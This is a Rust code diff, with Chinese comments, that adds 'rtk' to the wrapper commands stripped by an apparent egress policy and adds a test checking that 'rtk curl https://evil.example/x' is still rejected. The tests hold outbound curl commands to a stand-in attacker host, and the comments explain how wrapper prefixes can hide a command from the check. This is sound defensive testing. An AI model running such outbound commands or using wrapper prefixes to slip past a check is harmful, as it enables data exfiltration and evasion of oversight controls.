@@ -127,8 +127,13 @@ const INTERPRETERS: [&str; 7] = [
 ];
 
 /// 前缀包装命令：跳过它们再看真正的命令词（`sudo curl …` 与 `curl …` 同判）。
-const WRAPPERS: [&str; 8] = [
-    "sudo", "env", "nohup", "time", "command", "nice", "exec", "doas",
+///
+/// `rtk` 在列（票 03）：改写**只换执行形态、不换意图**——`rtk curl https://evil.example/x`
+/// 与 `curl …` 是同一件事，若不改写时判为出口、改写后放行，那道闸就成了一道
+/// 「改写开着就失效」的闸。改写后的命令也要过这道 check（顺序不变量，票 03 的判决顺序
+/// 是 `check(原命令) → 改写 → 落台账 → spawn`，两道都过）。
+const WRAPPERS: [&str; 9] = [
+    "sudo", "env", "nohup", "time", "command", "nice", "exec", "doas", "rtk",
 ];
 
 /// 被拒命令落 `kanban_node_commands` 时的 `exit_code`。
@@ -807,6 +812,15 @@ mod tests {
         let p = policy(&[]);
         assert!(p.check("sudo curl https://evil.example/x").is_err());
         assert!(p.check("TOKEN=1 curl https://evil.example/x").is_err());
+    }
+
+    /// `rtk` 也是包装命令（票 03）：改写开着不能让出口那道闸失效。
+    #[test]
+    fn rtk_prefix_does_not_hide_the_command() {
+        let p = policy(&[]);
+        assert!(p.check("rtk curl https://evil.example/x").is_err());
+        // 非出口的 rtk 命令照旧放行（这道闸只管出口，不管改写名单）。
+        assert!(p.check("rtk read Cargo.toml").is_ok());
     }
 
     // ────────────────────── 白名单条目的解析期校验 ──────────────────────
